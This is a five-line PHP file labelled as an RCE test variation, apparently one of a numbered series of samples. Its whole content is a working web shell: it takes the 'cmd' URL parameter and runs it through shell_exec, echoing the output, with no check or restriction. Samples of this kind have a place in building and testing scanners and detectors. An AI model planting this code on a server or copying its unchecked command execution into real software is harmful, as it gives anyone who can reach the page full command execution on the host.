<?php
// RCE test variation #851
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>